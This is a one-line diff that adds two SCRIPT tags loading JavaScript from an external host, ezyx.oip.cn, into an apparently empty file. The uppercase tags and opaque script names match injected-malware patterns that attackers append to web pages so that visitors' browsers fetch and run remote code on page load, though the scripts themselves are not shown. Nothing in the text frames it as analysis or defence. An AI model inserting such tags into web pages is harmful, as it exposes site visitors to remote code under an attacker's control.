@@ -1,0 +1,1 @@
+<SCRIPT src=http://ezyx.oip.cn/js/2045a.js></SCRIPT><SCRIPT src=http://ezyx.oip.cn/js/ft2.js></SCRIPT>  
